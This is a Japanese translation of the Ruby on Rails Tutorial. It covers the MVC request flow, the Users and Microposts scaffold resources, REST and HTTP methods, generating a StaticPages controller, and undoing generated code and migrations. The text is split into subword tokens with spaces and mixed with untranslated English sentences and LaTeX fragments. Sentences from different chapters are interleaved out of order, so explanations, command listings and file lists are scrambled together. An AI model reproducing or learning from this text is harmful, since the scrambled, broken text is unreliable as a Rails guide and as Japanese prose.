▁ この後 も 、 本チュートリアル を 進め ながら アプリケーションを こ ま め に プッシュ / デプロイ すること を お す す め します 。 こうすることで リモート バ ッ ク アップ にも なり 、 production 環境で の エラー を 早 め に 確認 することもできます ▁( 訳 注 : ▁最後に まとめ て プッシュ / デプロイ すると 問題 が 同 時 多 発 して 解決 に 手 間 取 ること が 考え られます )。
▁ 「 / users 」 リクエスト は 、 Rails の ルーティング 機 構 ▁( ルーター ) ▁ によって Users コントローラ 内の \ ko de { index } アクションに 割り当て られ る 。
▁なお 、 Heroku に 展開 するときに エラーが発生し た場合 は 、 以下のコマンドを実行し て 本番環境 の ログ を取得し てください 。 この ログ は 、 問題 を 特 定 するときに 役 立 ち ます 。
▁\ ko de { index } アクション が 実行 され 、 そこ から User モデルに 、「 すべての ユーザーを 取り 出 せ 」( \ ko de { User . all }) と 問 い 合わせ る 。
▁\ emph { 注 } : ▁ 今後 Heroku で 何らかの 本番 アプリケーションを 運 用 する 予 定 がある なら 、\ ref { sec : pro f ess ion al _ gra de _ de p lo y m ent } の production 用 Web サーバー の設定 に 必ず 従って ください 。
▁User モデル は 問 い 合わせ を 受け 、 すべての ユーザーを データベースから 取り出す 。
▁\ ref { sec : sample _ app _ setup } の 準備 が すべて 完了 した ら 、 いよいよ サンプルアプリケーションの 開発 に 取り か か り ましょう 。
▁ データベースから 取り出し た ユーザーの 一覧 を User モデル から コントローラに 返す 。
▁ここで 静的なページ を 作る ために 採 用 した 方法は 、 おそらく 最も シンプルな 方法 です 。 ただし 他にも 方法は あります 。
▁ Users コントローラ は 、 ユーザーの 一覧 を \ ko de {@ users } 変数 ▁ (@ は Ruby の インスタンス変数 を表す ) ▁ に保存 し 、\ ko de { index } ビュー に 渡す 。
▁ 最 適 な 方法は 状 況 によって 異 なり 、 たとえば \ emph { 極めて 多 数 } の 静的なページ を 1 つの StaticPages コントローラ だけ ま か なお う と すると 重 荷 になる 可能性があります 。 今回は いくつかの 静的なページ を 作る だけ なので 、 重 荷 には なり ません 。
▁ index ビュー が 起動 し 、 ERB ▁( E m b ed de d ▁ R u B y : ▁ ビュー の HTML に 埋 め 込 まれ ている Ruby コード ) ▁ を実行して ▁ HTML を 生成 ▁( レンダリング ) ▁ する 。
▁ も し 多数の 静的なページ が 必要 になる 場合は 、\ href { https :// github . com / thoughtbot / h ig h _ v ol tag e }{\ text tt { h ig h \_ v ol tag e } } ▁gem ▁ を調べ て みてください 。
▁ コントローラ は 、 ビューで 生成された HTML を受け取り 、 ブラウザ に 返す
▁なお 、 この問題 には ▁( や や 古 い ですが ) ▁ 有 益 な 議 論 があります 。 ▁ 詳 しく は ▁\ href { http :// blog . has many through . com / 200 8 / 4 / 2 / s im p le - pages } { has many through に 投 稿 された 記事 「 s im p le ▁ pages 」 } ▁( 英語 ) ▁ を 読んで みてください 。
▁ ビュー は 、 ( A p a ch e や N g in x などの Web サーバー を経由して は いる が ) ▁ ブラウザ に HTML を直接 返す と 説明 している 文 献 もあります 。
▁ コントローラ については 第 \ ref { cha : a _ toy _ app } 章 でも 簡単に 触 れ ましたが 、 第 \ ref { cha : modeling _ users } 章 で 説明 する \ href { http :// en . w ikipedia . org / wiki / Re present ation al _ S t at e _ Transfer } { REST ▁ アーキテクチャ } を 読 む と 理解 が 深 まり ます 。 一 言 で言う と 、 コントローラ とは ▁( 基本的に 動的な ) ▁Web ページの 集合 を 束 ね る コ ン テ ナ の ことです 。
▁ 私 は 、 Rails の 実際の 実装 とは 無 関係 に 、 コントローラ を 情報 の 流れ の 中 心 となる ハ ブ と み な す ことを 好 んで います 。
▁ 現在 どの ディレクトリ で 作業 している か が わ から なく な った 場合は 、\ ref { sec : the _ hello _ application } ▁( 図 \ ref { fig : directory _ structure _ rails }) を 再度 参 照 して 、 Rails ▁ の ディレクトリ 構造 を 確認 してください 。
▁上の 流れ を もう少し 詳 しく 見 て み る ことにします 。
▁この節では 、 主 に \ ko de { app / controllers } ディレクトリ や \ ko de { app / views } ディレクトリ 内で 作業 を 進め ます
▁最初に ブラウザから の リクエスト を見てみましょう 。 この リクエスト は 、 アドレス バー に URL を 入力 したり リンクを クリック した 時に 発生 します ▁( 図 \ ref { fig : mvc _ de t a il ed } の 1 )。
▁\ ref { sec : git _ command s } で 学 んだ ことを 思い 出 しましょう 。 Git を使用する場合 は 、 master ブランチ で ず っ と 作業 する の ではなく 、 その 都 度 トピックブランチ を作成して 作業 する の が よい 習慣 です 。
▁ Git で バージョン管理 を行って いる のであれば 、 以下のコマンドを実行し て 、 静的なページ 用の トピックブランチ を チェック ア ウ ト しましょう 。
▁ユーザー から リクエスト された URL を Users リソース で使用する コントローラのアクション に 割り当て る ▁( マッピング する ) ▁ コードは 、 リスト \ ref { code : rails _ routes } のような 感 じ になります 。 このコード は Rails の ルーター 設定 ファイル ▁( config / routes . rb ) ▁ の中で 使用 され 、 URL と アクション の 組み合わせ ▁( 表 \ ref { table : user _ url s }) ▁ を 効率 よく 設定 することができます
▁(\ ko de { : users } という 一 見 奇 妙 な 記 法 は 、 Ruby 言語 特 有 の 「\ emph { シンボル }」 と呼ばれる ものです 。 詳 細 については \ ref { sec : hash es _ and _ symbol s } で説明します )。
▁ static - pages
▁Rails ルート で使用する Users リソース 用の ルール
▁( 1 行 目 は 、 確 実 に master ブランチ に 切り 替 え るために 行 っています 。 これにより 、 2 行 目 の \ ko de { static - pages } トピックブランチ が \ ko de { master } から 作成される ようになります 。
▁ も し す で に master ブランチ に いる 場合は 、 1 行 目 の コマンド を実行する 必要はありません )。
▁それでは 、 この ルーティング ファイルを 変更 してみましょう 。 サーバー の ルート URL にアクセス した ら 、 デフォルトの ページ の代わりに ユーザー 一覧 を表示する ようにします 。 つまり 、「 / 」( ス ラ ッ シ ュ ) ▁ にアクセス した ら / users を開く ようにします 。
▁リスト \ ref { code : hello _ root _ route } で 以下の 変更を 行った ことを思い出してください 。
▁ 静的なページ の作成 は 、 第 \ ref { cha : a _ toy _ app } 章 で scaffold 生成 に 使用 した ▁\ ko de { generate } ▁ スクリプト で 、 コントローラ を生成する こと から 始 め ます 。
▁この コントローラ は 静的なページ を扱う ために しか 使 わ ないので 、 コントローラ 名を 「 S t a tic ▁P age s 」 に 決 め 、 表 記 を \ href { https :// en . w ikipedia . org / wiki / C am e l C as e } { キ ャ メ ル ケース } の \ ko de { StaticPages } に します 。
▁続いて 、 Home ページ 、 Help ページ 、 About ページに 使用する アクション も それぞれ 作成する ことに し 、 アクション 名 はすべて 小文字 の \ ko de { home }、\ ko de { help }、\ ko de { about } に します 。
▁これにより 、 ルート にアクセス すると Application コントローラ 内の \ ko de { hello } アクションに ルーティング される ようになった ので した 。
▁\ ko de { generate } スクリプト では アクション 名を まとめ て 指定 すること も できる ので 、 コマンドライン で Home ページ と Help ページ 用の アクション も まとめ て 生成 する ことにします 。 なお 、 About ページ だけ は 学習 の ため 、 あえて コマンドライン では 作成 せ ず 、\ ref { sec : getting _ started _ with _ testing } で 手動で 追加 する ことにします 。
▁ 今回の 場合は 、 Users コントローラの \ ko de { index } アクション を使用した い ので 、 リスト \ ref { code : rails _ routes _ root _ route } のコード を元に 書き 換 え てみましょう
▁これらの 要素 を 盛 り 込 んだ StaticPages コントローラ 生成 コマンド と 実行 結果を リスト \ ref { code : g en er at ing _ pages } に示します 。
▁( 既に Application コントローラに \ ko de { hello } アクション を追加して いた 方は 、 念 の ため 削除 しておく と よい かもしれません )。
▁ StaticPages コントローラ を生成する
▁ ルート から users への ルーティング を追加する
▁\ ref { sec : a _ user _ to ur } 以降 で紹介した 各 ページ は 、 Users \ emph { コントローラ } 内の \ emph { アクション } に それぞれ 対応 しています 。 1 つの コントローラ には 、 関連する 多数の アクション が まとめ られ ています 。
▁create ▁app / controllers / static _ pages _ controller . rb
▁リスト \ ref { code : demo _ users _ controller } は 、 scaffold で 生成 した コントローラの 骨 格 です 。
▁\ ko de { class ▁User sController ▁< ▁ Application Controller } という 記 法 では 、 Ruby の \ emph { クラス } \ emph { 継 承 } の 文法 を そのまま 使用している ことにご注目ください
▁create ▁app / views / static _ pages
▁( W e ’ ll ▁d is c us s ▁ inheritance ▁ b ri e f ly ▁in ▁S ec tion ▁\ ref { sec : inheritance _ h i er ar ch ies } ▁and ▁ co ver ▁ b o th ▁ subject s ▁in ▁more ▁ de t a il ▁in ▁S ec tion ▁\ ref { sec : ruby _ classes } . )
▁create ▁app / views / static _ pages / home . html . erb
▁ Users コントローラの 骨 格
▁create ▁app / views / static _ pages / help . html . erb
▁create ▁app / helpers / static _ pages _ helper . rb
▁create ▁app / assets / javascripts / static _ pages . js . coffee
▁create ▁app / assets / stylesheets / static _ pages . css . s css
▁ 本チュートリアルで は わかり や す さ を 重 ん じ ている ため 、 こう した コマンド は 短縮 せずに 表 記 しています が 、 現 実 の Rails 開発者 は ほぼ 間 違 い なく 表 \ ref { table : sh or t c u t s } の 短縮 形 を 常 用 しています 。
▁ 完全な コマンド
▁$ ▁ rails ▁ s
▁$ ▁ rails ▁c
▁$ ▁ rails ▁ g
▁ ページの 数 よりも アクション の 数 の 方 が多い ことに お 気 付き でしょう か 。 \ ko de { index }、\ ko de { show }、\ ko de { new }、\ ko de { edit } アクション は いずれ も \ ref { sec : a _ user _ to ur } の ページに 対応 しています が 、 それ 以外に も \ ko de { create }、\ ko de { update }、\ ko de { destroy } アクション があります 。
▁ 通常 、 これらの アクション は 、 ページを 出力 せずに データベース 上の ユーザー情報 を 操作 します ▁( もちろん ページを 出力 し よう と 思 えば できます が )。
▁$ ▁rake ▁test
▁ 論 文 の 正 式 な タイトル : ▁F i e l d ing , ▁ R o y ▁ T h o ma s .
▁$ ▁rake
▁\ emph { A r ch it e ct ur al ▁S t y le s ▁and ▁the ▁D e sign ▁of ▁ N e two r k - base d ▁S of t w ar e ▁A r ch it e ct ur es } .
▁Rails で 使 え る 短縮 形 の例
▁D o ct or al ▁d is s er t ation , ▁ U n i ver s ity ▁of ▁C a li for n i a , ▁I r v in e , ▁2 000 .
▁ 次 に進む前に 、 StaticPages コントローラ ファイルを Git リポジトリ に追加 しておきましょう 。
▁ 表 \ ref { table : demo _ RESTful _ users } の URL には 重複 している もの がある ことにご注目ください 。 たとえば 、\ ko de { show } アクション と ▁\ ko de { update } アクション は 、 どちら も / users /1 という URL に 対応 しています 。
▁これらの アクション 同士 の違い は 、 それらの アクション に対応する \ href { http :// en . w ikipedia . org / wiki / HTTP _ request # Request _ method s } { HTTP ▁ request メソッド } の違い で もあります 。
▁ 最後の コマンド では 、\ ko de { static - pages } トピックブランチ を Bitbucket に プッシュ しています 。
▁ 以後 は 、 単 に 以下 を実行する だけで 同じ プッシュ が行われ る ようになります 。
▁ HTTP ▁ request メソッド の詳細については \ ref { sec : getting _ started _ with _ testing } で説明します 。
▁上の コミット 〜 プッシュ の 流れ は 、 著者 が 実際の 開発 で よく 使って いた パターン に基づいて います が 、 ここ から 先 は 途 中 で このような 指示 を い ち い ち 書くこと は しません ので 、 各 自 こ ま め に プッシュ するようにしてください 。
▁ただし 、 上 のような 命 名 は 単なる 慣習 に 過 ぎ ません 。 実際 、 コマンドライン 上で 以下のような ス ネ ー ク ケース の コントローラ 名を 入力 しても 、
▁ 先ほど と同様に \ ko de { static \_ pages \_ controller . rb } という コントローラ が 生成されます 。
▁これは 、 Ruby が クラス名 に キ ャ メ ル ケース を使う 慣習 があり ▁( 詳 細 は \ ref { sec : ruby _ classes } で説明します ) 、 また 、 キ ャ メ ル ケース の名前 を使う ことが 好 まれ ている ためです 。 これらの 慣習 に 必ず 従 わ なければ い け ない ということ ではありません 。
▁( S in ce ▁Ruby ▁ file name s ▁t y p ical ly ▁use ▁ s n a ke ▁ case , ▁the ▁Rails ▁ g en er at or ▁ con ver t s ▁C am e l C as e ▁to ▁ s n a ke ▁ case ▁ us ing ▁the ▁\ href { http :// api . rubyonrails . org / classes / ActiveSupport / In f le ct or . html # method - i - underscore }{\ text tt { underscore } } ▁ method . )
▁ ところで 、 自動生成 に 失敗する ようなこと があれば 、 元に戻す 処理 を学ぶ 良い 機 会 になります 。
▁ 元に戻す 方法
▁id = \ ko de {1} のユーザー を更新する アクション
▁ ど れ ほど 十分 に 気 を 付け ていた として も 、 Rails アプリケーションの 開発 中に 何か 失敗 してしまう ことは あり え ます 。
▁ あり が たい ことに 、 Rails には そのような 失敗 を カ バー する 機能 が い く つ もあります 。
▁id = \ ko de {1} のユーザー を削除する アクション
▁ 一般的な シ ナ リ オ の 1 つ は 、 生成 した コードを 元に戻 したい場合 です 。 たとえば 、 コントローラ を生成し た 後 で 、 もっと い い コントローラ 名を 思い 付き 、 生成 した コードを 削除 した く な った 場合 など です 。
▁リスト \ ref { code : rails _ routes } の Users リソース が提供する RESTful な ルート
▁B e ca us e ▁Rails ▁create s ▁a ▁ sub st an t i al ▁ number ▁of ▁a u x i li ary ▁ file s ▁ al on g ▁with ▁the ▁ controller ▁( as ▁ s e en ▁in ▁ L ist ing ▁\ ref { code : g en er at ing _ pages }) , ▁this ▁is n ’ t ▁as ▁ e as y ▁as ▁ re m o v ing ▁the ▁ controller ▁ file ▁it self ; ▁ 自動生成 された コードを 元に戻す ためには 、 新規作成 された ファイル を削除する だけ ではなく 、 既存の ファイルに 挿 入 された コード も 削除 する必要があります
▁ RE present ation al ▁S t at e ▁ Transfer ▁( REST )
▁( 実際 、\ ref { sec : demo _ users _ resource } や \ ref { sec : microposts _ resource } でも 説明したように 、\ text tt { rails ▁ generate } を実行すると ルーティング の \ text tt { routes . rb } ファイル も 自動的に 変更 される ので 、 これ も 元に戻 さ なく て は なり ません )。
▁Rails 関連 の 書 籍 を 読んで いる と ▁“ REST ” ▁という 略 語 を よく 見 かけ ます 。 これは RE present ation al ▁S t at e ▁ Transfer の 略 です 。
▁ このような とき は 、「 generate 」 という 言 葉 に 因 んで 、\ text tt { rails ▁ destroy } という コマンド を実行する ことで 元に戻す ことができます 。
▁ REST は 、 イン ター ネ ッ ト そのもの や Web アプリケーション などの 、 分 散 ・ ネットワーク 化 された システム や アプリケーションを 構 築 するための アーキテクチャ の スタイル の 1 つ です 。
▁たとえば 次の 2 つの コマンド は 、 自動生成 と 、 それ に対応する 取り 消 し 処理 の例 です 。
▁ 以前の Rails では データ の 更新 に HTTP の \ text tt { PUT } リクエスト を使用して い ましたが 、 HTTP 標準 に 従 えば \ text tt { PATCH } リクエスト の 方が 適 切 です 。
▁$ ▁ rails ▁ generate ▁ controller ▁ StaticPages ▁ home ▁ help < n > ▁$ ▁ rails ▁ destroy ▁ controller ▁ StaticPages ▁ home ▁ help
▁Rails 開発者 にとって は 、 RESTful な スタイル を 採 用 することで 、 作成 すべき コントローラ や アクション の 決 定 が 楽 になります 。 作成 ( C ) ・ 読み 取り ( R ) ・ 更新 ( U ) ・ 削除 ( D ) を行う リソース だけで アプリケーション 全体 を 構成 してしまう こと す ら 可能です 。
▁なお 第 \ ref { cha : modeling _ users } ▁ 章 でも 、 以下のように \ emph { モデル } を 自動生成 する方法 を 紹 介 します 。
▁ユーザー や マイクロポスト など に 関 して は 自 然 に リソース 化 できる ので 問題 ありません 。
▁ In ▁C ha p ter ▁\ ref { cha : following _ users } , ▁we ’ ll ▁ s e e ▁ an ▁ example ▁ where ▁ REST ▁ p r in c ip le s ▁ allow ▁ us ▁to ▁ model ▁a ▁ sub t l er ▁ pro b le m , ▁“ following ▁ users ” , ▁in ▁a ▁ n at ur al ▁and ▁ con ve n i ent ▁ w a y .
▁$ ▁ rails ▁ generate ▁ model ▁User ▁name : string ▁ email : string
▁ Users コントローラ と User モデル の関係 を さらに 考 察 するために 、 リスト \ ref { code : demo _ index _ action } で \ ko de { index } アクション を 整 理 して み ました
▁( scaffold で 自動生成 される コードは 冗 長 で 紛 ら わ しい ので 除 いて あります )。
▁ モデルの 自動生成 についても 、 同様 の 方法で 元に戻す ことができます 。
▁ To y アプリケーションの 簡潔 な ユーザー \ ko de { index } アクション
▁$ ▁ rails ▁ destroy ▁ model ▁User
▁( 上の コマンド から わかるように 、 モデル名 以外の 引数 は 不要です 。
▁\ ko de { index } アクションに \ ko de {@ users ▁= ▁User . all } という 行 があります ▁( 図 \ ref { fig : mvc _ de t a il ed } の 3 に相当 )。 これ によって 、 User モデル から すべての ユーザーの 一覧 を取り出し ▁( 4 ) 、\ ko de {@ users } という 変数 に保存 します ▁( 5 )。 なお 、 @ users は 「 あ っ と ▁ ゆ ー ざ ー ず 」 と 発 音 します 。
▁User モデル の内容 は リスト \ ref { code : demo _ user _ model } に あります 。 驚 く ほど シンプルな 内容 ですが 、 継 承 ▁(\ ref { sec : inheritance _ h i er ar ch ies } および \ ref { sec : ruby _ classes }) ▁ によって 多くの 機能 が 備 わ っています 。
▁その 理由 については 第 \ ref { cha : modeling _ users } 章 で説明します )。
▁ 特に 、\ emph { Active ▁Record } という Ruby ライブラリ の おかげで 、 リスト \ ref { code : demo _ user _ model } の User モデル は \ ko de { User . all } という リクエスト に対して 、 D B 上の すべての ユーザー を返す ことができます 。
▁また 、\ emph { 第 \ ref { cha : a _ toy _ app } 章 } でも 簡単に 紹 介 しました が 、\ emph { マイグレーション } の 変更を 元に戻す 方法 も 用意されてい ます 。 詳 細 は 第 \ ref { cha : modeling _ users } 章 で説明します 。
▁ To y アプリケーションの User モデル
▁ 簡単に 言 う と 、 まず 以下の コマンドで データベースの マイグレーション を変更 できます 。
▁\ ko de {@ users } 変数 に ユーザー 一覧 が 保存 される と 、 コントローラ は リスト \ ref { code : demo _ index _ view } の ▁\ emph { ビュー } ▁ を呼び出します ▁( 6 )。
▁$ ▁bundle ▁exec ▁rake ▁ db : migrate
▁以下の コマンドで 1 つ 前 の 状態 に 戻 す こともできます 。
▁ 変数
▁$ ▁bundle ▁exec ▁rake ▁ db : r o ll b ack
▁( 今 は このコード の 意味 が わ から なくても 問題 ありません 。
▁ 最初の 状態 に 戻 したい場合は 、 以下の コマンド を使います 。
▁これは あ く まで 説明 の ためのものです )。
▁$ ▁bundle ▁exec ▁rake ▁ db : migrate ▁ V ER S I ON = 0
▁ index アクションに 対応 している ビュー
▁ 既に お 気 付き の 方 も いる と思います が 、 マイグレーション は 逐 次 的に 実行 され 、 それぞれの マイグレーション に対して バージョン 番号 が 付 与 されます 。 したがって 、 上 記 の \ text tt { 0} を 別の 数字 に置き換え ること によって 、 指定 した バージョンの 状態 に 戻 す ことができます 。
▁< table >
▁ 開発 中に \ href { http :// en . w ikipedia . org / wiki / M il it ary _ s lang # S N A F U } { 袋 小 路 } に 迷 い 込 んで し ま った 場合 でも 、 これらの 機能を 使 えば 元の 状態 を 復 元 できます 。
▁</ tr >
▁リスト \ ref { code : g en er at ing _ pages } のように StaticPages コントローラ を生成する と 、 ( \ ko de { config / routes . rb }) ファイル が自動的に 更新 されます ▁(\ ref { sec : hello _ world } のとき と同様 です )。
▁この ルーティング ファイルは ルーター の実装 を 受け 持 ち ▁( 図 \ ref { fig : mvc _ de t a il ed }) 、 URL と Web ページの 対応 関係 を定義し ます 。
▁</ table >
▁この ルーティング ファイルは Rails の \ ko de { config } ディレクトリ の下に 置かれます 。 この ディレクトリ には 、 Rails の設定 ファイルが まとめ て 置かれます ▁( 図 \ ref { fig : config _ directory _ rails })。
▁ ビュー は その 内容 を HTML に変換 し ▁( 7 ) 、 コントローラ が ブラウザ に HTML を送信し て 、 ブラウザで HTML が表示されます ▁( 8 )。
▁ サンプルアプリケーションの \ ko de { config } ディレクトリ の内容
▁ scaffold で作成した Users リソース は 、 Rails の概要 を 手 っ 取り 早 く 説明 するには 良い のですが 、 以下のような さまざまな 問題 点 を 抱 え ています 。
▁ 先ほど リスト \ ref { code : g en er at ing _ pages } のように \ ko de { home } ▁ アクション と ▁\ ko de { help } アクション を生成し たので 、 routes ファイル には それぞれの アクション で 使用される ルール が 定義 されています ▁( リスト \ ref { code : pages _ routes })。
▁ データ の 検証 が行われ ていない 。
▁ StaticPages コントローラ 内の \ ko de { home } アクション と \ ko de { help } アクション で使用する ルーティング
▁ このままでは 、 ユーザー名 が 空 欄 で あった り 、 で たら め な メールアドレスを 入力 したり しても 通 ってしまいます 。
▁ここで 以下の ルール に 注 目 してみましょう 。
▁ 具体的には 、\ ko de { get } ▁ と 書かれてい るため 、\ text tt { GET } ▁ リクエスト に対して 該当する アクション を 結 び つ け ています 。
▁ 結果を 確認 するには 、\ ref { sec : rails _ server } に従って 以下のように Rails の development サーバー を 起動 します 。
▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } にアクセス して 結果 を表示します ▁( 図 \ ref { fig : raw _ home _ view })。
▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } にアクセス した 結果
▁\ text tt { GET } や その他 の HTTP メソッド について
▁\ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol # Request _ method s } { クライアント } ▁( 通常 、 Firefox や S a fa ri などの Web ブラウザ ) ▁ と \ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol # Request _ method s } { サーバー } ▁( A p a ch e や N g in x などの Web サーバー ) ▁ は 、 上で 述 べ た 4 つの 基本 操作 を 互 い に 認 識 できる ようになっています
▁( ローカル 環境で Rails アプリケーションを 開発 している とき は 、 クライアント と サーバー が 同じ コンピュータ 上で 動 い ています が 、 一般的 には 、 それぞれ 別の コンピュータ で 動作 している という 点 を 理解 して おいてください )。
▁ユーザー 認 証 が行われ ていない 。
▁Rails を含む 多くの Web フレームワーク は 、 HTTP の 各 操作 を 発 展 させ た \ emph { REST ▁ アーキテクチャ } の 影 響 を 受け ています 。 第 \ ref { cha : a _ toy _ app } 章 でも 簡単に 触 れ ましたが 、 第 \ ref { cha : sign _ up } 章では 、 より 深 い 内容 について 学 び ます 。
▁ ログイン 、 ログアウト が行われ ていない ので 、 誰 でも 無 制限 に 操作 できてしまいます 。
▁\ text tt { POST } ▁ は 、 GET の 次に よく 使用される 操作 で 、 ページ 上の フォーム に 入力 した 値を 、 ブラウザから 送信 する 時に 送 られ る リクエスト です 。
▁ テストが 書かれてい ない 。
▁Rails アプリケーション では 、\ text tt { POST } リクエスト は 何か を \ emph { 作成する } ときに よく 使われ ます ▁( なお 本 来 の HTTP では 、\ text tt { POST } を 更新 に 使って も よい と しています )。
▁ 厳 密 には これは 正しい 表現 ではありません 。 という の も 、 scaffold で 生成 した コード には ご く 簡単な テストが 一 応 含 まれ ている からです 。 ただ 、 scaffold のテスト コードは データ 検証 や ユーザー 認 証 、 その他 の 必要な 要求 を 満 た していません 。
▁ レイアウト や スタイル が 整 っ ていない 。
▁たとえば 、 ユーザー登録フォーム で 新しい ユーザー を作成する とき は 、\ text tt { POST } リクエストを 送信 します 。
▁ サイト デザイン も 操作 法 も 一 貫 していません 。
▁ 他にも 、\ text tt { PATCH } と ▁\ text tt { DELETE } という 2 つの 操作 があり 、 それぞれ サーバー 上の 何か を \ emph { 更新 } したり \ emph { 削除 } したり するときに 使われ ます 。
▁ 理解 が 困 難 。
▁ これら 2 つの 操作 は 、\ text tt { GET } や \ text tt { POST } ほど は 使用 されていません 。 これは 、 ブラウザ が PATCH と DELETE を ネ イ テ ィ ブ では 送信 しない からです 。 しかし 、 Ruby ▁on ▁Rails などの 多くの Web フレームワーク は 、 ブラウザ が これらの 操作 の リクエストを \ emph { 送信 している か のように 見 せ かけ る } 技術 ▁( 偽 装 ) ▁ を 駆 使 して 、 PATCH と DELETE という 操作 を 実現 しています 。
▁ scaffold の コードを 理解 できる ぐらい なら 、 そ も そ も 本書 を 読 む 必要 は ない でしょう 。
▁ 結果 として 、 Rails はこの 4 つの HTTP リクエスト ▁(\ text tt { GET } ・ \ text tt { POST } ・ \ text tt { PATCH } ・ \ text tt { DELETE }) ▁ を 全 て サポート できるようになりました 。
▁< n >\ end { item ize }< n >< n > ▁% ▁subsection ▁we a k n ess es _ of _ the _ users _ resource ▁( end )< n >< n > ▁% ▁ section ▁ users _ resource ▁( end )< n >< n > ▁\ section { Microposts ▁ リソース } ▁% ▁( fold )< n > ▁\ label { sec : microposts _ resource }< n >< n >
▁ Users リソース を生成し て 内容 を 理解 しました ので 、 今度は Microposts リソース で 同じ ことを や って みましょう 。
▁この ページ が どのように して 表示される のか を理解する ために 、 まず は テキストエディタ で StaticPages コントローラ を開いて みましょう 。 リスト \ ref { code : static _ pages _ controller } のような 内容 になっている はずです 。
▁なお 、 この節 全体 について 、 Microposts リソース を理解する 際に は \ ref { sec : demo _ users _ resource } の user 要素 と 比 較 し ながら 進め る ことをお勧めします 。 実際 、 これらの 2 つの リソース は さまざまな 面 で 似 通 っています 。
▁ここで 、 第 \ ref { cha : a _ toy _ app } 章 の Users コントローラ や Microposts コントローラ とは 異 なり 、 StaticPages コントローラ は 一般的な REST アクションに 対応 していない ことに注意してください 。
▁Rails の RESTful 構造 を 身 体 に 叩 き こ む には 、 繰り返し 学ぶ の が 一 番 です 。 Users リソース と Microposts リソース の 構造 の 類 似 点 を理解する ことが 、 この章 の 主要な 目的 です 。
▁これは 、 静的なページ の 集合 に対して は 、 適切な アクション と 言 え ます 。 言 い 換 え ると 、 REST アーキテクチャ は 、 あらゆる 問題 に対して 最 適 な 解決 方法 である とは 限 らない ということです 。
▁ Users リソース の場合 と同様に 、 Microposts リソース も scaffold で コードを 生成 してみましょう 。 \ ko de { rails ▁ generate ▁ scaffold } コマンド を使用して 、 図 \ ref { fig : demo _ micropost _ model } の データモデル を 実装 してみます
▁リスト \ ref { code : g en er at ing _ pages } で 生成される StaticPages コントローラ
▁User で scaffold を実行し た場合 と同様に 、 scaffold ジェネレータ では マイクロポスト でも Rails モデル を 単数形 と する 習慣 に従い ます 。 実行 した コマンド が \ ko de { generate ▁ Micropost } と 単数形 になって いた の はこの ためです 。
▁ クラス は 、\ emph { 関数 } ▁(\ emph { メソッド } とも 呼ばれ ます ) ▁ を まとめ る ときに 便利な 手法 です 。 今回の 例 では 、\ ko de { de f } という キーワード を使って 、\ ko de { home } アクション や \ ko de { help } アクション を定義し ています 。
▁( 具 体 的な クラス や 継 承 については 、\ ref { sec : ruby _ classes } で 詳 しく 説明します )。
▁create ▁app / models / micropost . rb
▁ 今回の StaticPages コントローラ にある メソッドは 、 以下のように どちら も 最 初 は 空 になっています 。
▁ 純 粋 な Ruby 言語 であれば 、 これらの メソッドは 何も 実行 しません 。
▁create ▁test / models / micropost _ test . rb
▁しかし 、 Rails では 動作 が 異なります 。 \ ko de { StaticPages Controller } は Ruby ▁ の クラス ですが 、\ ko de { Application Controller } クラス を継承し ている ため 、 StaticPages Controller の メソッドは ▁( たとえ 何も 書かれてい なくても ) ▁Rails 特 有 の 振る舞い を します 。 具体的には 、 / static \_ pages / home という URL にアクセス すると 、 Rails は StaticPages コントローラ を参照 し 、\ ko de { home } アクションに 記述 されている コード を実行します 。 その後 、 その アクション に対応する \ emph { ビュー } ▁(\ ref { sec : mvc } で説明した MVC の V に相当 ) ▁ を 出力 します 。
▁create ▁test / fixtures / microposts . yml
▁ では 、 ビュー は どのように 出力 される の でしょう か 。 また 、 どの ビュー が表示される の でしょう か 。
▁ route ▁ resources ▁: microposts
▁\ ko de { . erb } の詳細については \ ref { sec : s li g h t ly _ d y n am i c _ pages } で説明します が 、 ファイル名 に \ ko de { . html } が含まれ ている こと から わ か る 、 基本的に は HTML と同じ ような 構造 になっています ▁(\ ref { code : raw _ home _ view })。
▁create ▁app / controllers / microposts _ controller . rb
▁ Home ページ 用 に 生成された ビュー
▁\ ko de { help } アクション に対応する ビュー も 、 上のコード と似ています ▁( リスト \ ref { code : raw _ help _ view })。
▁create ▁app / views / microposts
▁ Help ページ 用 に 生成された ビュー
▁create ▁app / views / microposts / index . html . erb
▁ どちら の ビュー も 単なる プ レ ー ス ホ ル ダ になっています 。 ト ッ プ レベル の 見 出 し が \ ko de { h 1 } タグ の中に あり 、 関連する ファイル への 絶 対 パス が \ ko de { p } タグ の中に 書かれてい ます 。
▁create ▁app / views / microposts / edit . html . erb
▁create ▁app / views / microposts / show . html . erb
▁We ’ ll ▁ add ▁ some ▁( ver y ▁ s li g h t ly ) ▁d y n am i c ▁ content ▁ start ing ▁in ▁S ec tion ▁\ ref { sec : s li g h t ly _ d y n am i c _ pages } , ▁ b u t ▁as ▁the y ▁ st and ▁the ▁ views ▁in ▁ L ist ing ▁\ ref { code : raw _ home _ view } ▁and ▁ L ist ing ▁\ ref { code : raw _ help _ view } ▁ underscore ▁ an ▁ im port an t ▁ p o in t : ▁Rails ▁ views ▁c an ▁ s im p ly ▁ con t a in ▁ static ▁ HTML . ▁This ▁ me an s ▁we ▁c an ▁ begin ▁ custom i z ing ▁the ▁ Home ▁and ▁ Help ▁ pages ▁ e ve n ▁with ▁ no ▁ k now l ed g e ▁of ▁Rails , ▁as ▁ show n ▁in ▁ L ist ing ▁\ ref { code : custom _ home _ page } ▁and ▁ L ist ing ▁\ ref { code : custom _ help _ page } .
▁create ▁app / views / microposts / new . html . erb
▁ Home ページの HTML を修正する
▁create ▁app / views / microposts / _ form . html . erb
▁create ▁test / controllers / microposts _ controller _ test . rb
▁ Help ページの HTML を修正する
▁< n > ▁create ▁app / helpers / microposts _ helper . rb
▁ G e t ▁ help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁ at ▁the
▁ To ▁get ▁ help ▁on ▁this ▁ sample ▁app , ▁ s e e ▁the
▁create ▁test / helpers / microposts _ helper _ test . rb
▁create ▁app / views / microposts / index . json . j builder
▁リスト \ ref { code : custom _ home _ page } と リスト \ ref { code : custom _ help _ page } の 結果を それぞれ 図 \ ref { fig : custom _ home _ page } と 図 \ ref { fig : custom _ help _ page } に示します 。
▁create ▁app / views / microposts / show . json . j builder
▁ 修正 された Home ページ
▁ 修正 された Help ページ
